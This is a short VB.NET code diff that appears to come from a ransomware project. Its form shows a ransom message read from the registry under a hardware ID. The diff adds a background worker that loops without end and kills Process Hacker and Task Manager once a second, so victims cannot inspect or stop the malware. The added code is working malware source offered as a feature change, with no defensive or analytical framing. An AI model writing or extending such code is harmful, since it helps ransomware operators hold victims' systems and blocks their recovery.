@@ -36,6 +36,7 @@ Public Class Form1
             txtFiles.Text = "..."
             txtMSG.Text = My.Computer.Registry.GetValue("HKEY_CURRENT_USER\Software\" + C_ID.HWID, "Rans-MSG", Nothing)
             BackgroundWorker4.RunWorkerAsync()
+            BackgroundWorker5.RunWorkerAsync()
         Catch ex As Exception
         End Try
     End Sub
@@ -182,4 +183,20 @@ Public Class Form1
         End Try
     End Sub
 
+    Private Sub BackgroundWorker5_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker5.DoWork
+        Try
+
+            While True
+                For Each x As Process In Process.GetProcesses()
+                    If x.ProcessName = "ProcessHacker" OrElse x.ProcessName = "Taskmgr" Then
+                        x.Kill()
+                    End If
+                Next
+                Threading.Thread.Sleep(1000)
+            End While
+        Catch ex As Exception
+
+        End Try
+
+    End Sub
 End Class
